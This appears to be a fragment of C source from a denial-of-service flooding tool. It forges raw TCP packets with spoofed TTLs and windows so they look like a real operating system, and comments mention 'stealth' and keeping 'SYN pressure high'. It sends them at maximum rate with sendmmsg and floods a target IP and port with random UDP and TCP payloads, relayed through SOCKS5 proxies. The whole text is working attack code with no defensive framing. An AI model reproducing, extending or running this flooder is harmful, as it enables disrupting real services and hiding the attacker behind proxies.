                pl_sum_ch = huge_pl_sum[(pl_offset + current_pl) / 2] - huge_pl_sum[pl_offset / 2];

                { // Common send path
                unsigned int tot_tcp = V17TCP_TS + current_pl;
                unsigned int tot_ip = V17IP + tot_tcp;
                
                slot_seq[b] += current_pl;
                th->seq=htonl(slot_seq[b]);
                th->ack_seq=htonl(slot_ack[b]);
                th->source=htons(slot_sp[b]);
                
                // TCP Window fixed per connection to match real OS
                th->window=htons(slot_win[b]);

                ih->tot_len=htons(tot_ip);
                if(use_afp){
                    viov[b].iov_len = V17ETH + tot_ip;
                } else {
                    viov[b].iov_len = tot_ip;
                }

                // Per-connection fixed TTL (like real OS)
                ih->ttl = slot_ttl[b];
                unsigned int newttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
                unsigned short *iw2=(unsigned short*)ih;
                
                ih->id=htons(fast_rand()&0xFFFF);
                ih->check=0;
                unsigned int ic=iw2[0]+iw2[3]+htons(newttlproto)+iw2[6]+iw2[7]+iw2[8]+iw2[9];
                ic+=htons(tot_ip)+ih->id;
                ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
                ih->check=(unsigned short)~ic;

                // TCP checksum must include TS options (12 bytes = 6 words)
                th->check=0;
                unsigned short *tw2=(unsigned short*)th;
                unsigned int cs=tcp_base[b]+tw2[0]+tw2[2]+tw2[3]+tw2[4]+tw2[5]+tw2[7];
                cs += htons(tot_tcp);
                cs += tw2[6]; // flags
                // Add TS option words (tw2[10..15] = 12 bytes of NOP+NOP+TS)
                cs += tw2[10]+tw2[11]+tw2[12]+tw2[13]+tw2[14]+tw2[15];
                cs += pl_sum_ch;
                cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
                th->check=(unsigned short)~cs;

                vmsg_active[valid_pkts] = vmsg[b];
                valid_pkts++;
                } // end gh_send_common block
            }
            
            if(valid_pkts == 0){
                usleep(50); // Short sleep — keep SYN pressure high for fast 3WHS
                continue; // Skip sendmmsg, loop back to SYN/recv quickly
            }
            
            // REMOVED: usleep(250) was artificially limiting PPS to ~1M/thread
            // Adaptive backoff via ENOBUFS handler at line 1943 is sufficient

            if(round==1){
                LOG_INFO("T%d: hot loop done, calling sendmmsg valid_pkts=%d",tid,valid_pkts);
                fflush(stdout);
            }
            int sent=sendmmsg(fd_send,vmsg_active,valid_pkts,0);
            if(sent>0){
                unsigned long long tb2=0;
                for(int i=0; i<sent; i++){
                    tb2 += vmsg_active[i].msg_hdr.msg_iov->iov_len;
                }
                thread_stats[tid].packets     +=sent;
                thread_stats[tid].tcp_packets +=sent;
                thread_stats[tid].raw_sent    +=sent;
                thread_stats[tid].bytes       +=tb2;
            } else {
                thread_stats[tid].send_errors++;
                if(thread_stats[tid].send_errors==1){
                    LOG_INFO("T%d: sendmmsg FAIL fd=%d use_afp=%d valid_pkts=%d errno=%d (%s)",
                             tid,fd_send,use_afp,valid_pkts,errno,strerror(errno));
                    fflush(stdout);
                }
                if(errno==ENOBUFS||errno==EAGAIN){ usleep(50); continue; }
                else continue;
            }
            // Stealth: no extra jitter needed, pulse timing handles it
        }

        free(vbuf);free(vmsg);free(viov);free(tcp_base);free(ip_base);

        free(slot_seq);free(slot_ack);free(slot_sp);free(slot_st);free(slot_rn);
        free(slot_ttl);free(slot_win);
        free(recv_buf);free(syn_buf);free(ack_buf);
        close(fd_send);close(fd_send2);close(fd_recv);
        return NULL;
    }



    int epoll_fd = epoll_create1(0);
    struct epoll_event events[EPOLL_SIZE];
    
    // Pure TCP mode - no UDP fd setup
    
    long long last_timeout_check_ms = get_ms();
    
    int initial = args.rate / args.threads;
    if (args.is_v20_ws && initial < 500) initial = 500; // v20_ws: minimum 500 conns/thread
    
    for (int i = 0; i < initial; i++) {
        if (get_total_active_conns() >= args.rate) break;
        spawn_connection(epoll_fd, tid);
        
        if (i > 0 && i % 10 == 0) {
            int nfds = epoll_wait(epoll_fd, events, EPOLL_SIZE, 0);
            for (int j = 0; j < nfds; j++) handle_connection_event(epoll_fd, &events[j], tid);
        }
    }
    
    while (1) {
        int nfds = epoll_wait(epoll_fd, events, EPOLL_SIZE, 1);
        for (int i = 0; i < nfds; i++) handle_connection_event(epoll_fd, &events[i], tid);
        
        long long now = get_ms();
        
        // SOCKS5 and connection timeout checks
        if (now - last_timeout_check_ms >= 1000) {
            Connection *curr = active_conns_list;
            while (curr) {
                Connection *next_conn = curr->next;
                if (curr->stage != STAGE_ATTACKING && (now - curr->last_pulse_ms > 15000)) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                    
                    thread_stats[tid].connect_fail++;
                    if (curr->proxy) {
                        __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                        curr->proxy->last_fail_time = now;
                        if (curr->proxy->fail_count >= 50000) {
                            curr->proxy->is_dead = 1;
                        }
                        if (curr->proxy->active_conns > 0) { __sync_fetch_and_sub(&curr->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
                    } else {
                        if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
                    }
                    if (curr->ssl) SSL_free(curr->ssl);
                    if (curr->fd > 0) close(curr->fd);
                    if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                    
                    if (curr->prev) {
                        curr->prev->next = curr->next;
                    } else {
                        active_conns_list = curr->next;
                    }
                    if (curr->next) {
                        curr->next->prev = curr->prev;
                    }
                    free(curr);
                }
                curr = next_conn;
            }
            last_timeout_check_ms = now;
        }

        // Pure TCP mode - no UDP sending block

        // Active TCP sending loop for V15 to maximize PPS on fully completed connections
        if (args.is_v15_raw_amp || (args.is_hybrid_v15 && proxy_count > 0)) {
            Connection *curr = active_conns_list;
            while (curr) {
                Connection *next_conn = curr->next;
                if (curr->stage == STAGE_ATTACKING) {
                    if (curr->is_udp_assoc) {
                        int sent_count = 0;
                        int ret = 1;
                        while (sent_count < 32) {
                            int payload_len = 1200 + (fast_rand() % 200);
                            int offset = fast_rand() % (BUFFER_POOL_SIZE - payload_len);
                            
                            if (curr->proxy) {
                                int total_len = 10 + payload_len;
                                unsigned char udp_pkt[1500];
                                udp_pkt[0] = 0x00; udp_pkt[1] = 0x00; udp_pkt[2] = 0x00; udp_pkt[3] = 0x01;
                                memcpy(udp_pkt + 4, &bin_target_ip, 4);
                                memcpy(udp_pkt + 8, &bin_target_port, 2);
                                memcpy(udp_pkt + 10, global_buffer_pool + offset, payload_len);
                                ret = send(curr->client_udp_fd, udp_pkt, total_len, MSG_DONTWAIT);
                            } else {
                                ret = send(curr->client_udp_fd, global_buffer_pool + offset, payload_len, MSG_DONTWAIT);
                            }
                            
                            if (ret <= 0) {
                                break;
                            }
                            thread_stats[tid].packets++;
                            thread_stats[tid].bytes += ret;
                            sent_count++;
                        }
                        if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                            thread_stats[tid].connect_fail++;
                            if (curr->proxy) {
                                __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                curr->proxy->last_fail_time = now;
                                if (curr->proxy->fail_count >= 50000) {
                                    curr->proxy->is_dead = 1;
                                }
                                if (curr->proxy->active_conns > 0) {
                                    __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
                                    __sync_fetch_and_sub(&global_proxy_active_conns, 1);
                                }
                            }
                            if (curr->fd > 0) close(curr->fd);
                            if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                            if (curr->prev) {
                                curr->prev->next = curr->next;
                            } else {
                                active_conns_list = curr->next;
                            }
                            if (curr->next) {
                                curr->next->prev = curr->prev;
                            }
                            free(curr);
                        }
                    } else if (curr->writable) {
                        int cork = 1;
                        setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        int ret;
                        int batch_count = 0;
                        while (1) {
                            int s = 32768 + (fast_rand() % 32768);
                            int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                            ret = send(curr->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
                            if (ret <= 0) {
                                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                                    curr->writable = 0;
                                }
                                break;
                            }
                            thread_stats[tid].packets++;
                            thread_stats[tid].tcp_packets++;
                            thread_stats[tid].bytes += ret;
                            batch_count++;
                            if (batch_count >= 64) {
                                cork = 0;
                                setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                                cork = 1;
                                setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                                batch_count = 0;
                            }
                        }
                        cork = 0;
                        setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                            thread_stats[tid].connect_fail++;
                            if (curr->proxy) {
                                __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                curr->proxy->last_fail_time = now;
                                if (curr->proxy->fail_count >= 50000) {
                                    curr->proxy->is_dead = 1;
                                }
                                if (curr->proxy->active_conns > 0) {
                                    __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
                                    __sync_fetch_and_sub(&global_proxy_active_conns, 1);
                                }
                            } else {
                                if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
                            }
                            if (curr->ssl) SSL_free(curr->ssl);
                            if (curr->fd > 0) close(curr->fd);
                            if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                            
                            if (curr->prev) {
                                curr->prev->next = curr->next;
                            } else {
                                active_conns_list = curr->next;
                            }
                            if (curr->next) {
                                curr->next->prev = curr->prev;
                            }
                            free(curr);
                        }
                    }
                }
                curr = next_conn;
            }
        }
        
        int total = get_total_active_conns();
        if (total < args.rate) {
            int batch = (args.rate - total);
            if (args.is_v19_tcp) {
                if (batch > 64) batch = 64;
            } else if (args.is_v20_ws) {
                if (batch > 128) batch = 128; // v20_ws: aggressive respawn
            } else {
                if (batch > 32) batch = 32;
            }
            for (int b = 0; b < batch; b++) {
                if (get_total_active_conns() >= args.rate) break;
                spawn_connection(epoll_fd, tid);
            }
        }
    }
    return NULL;
}
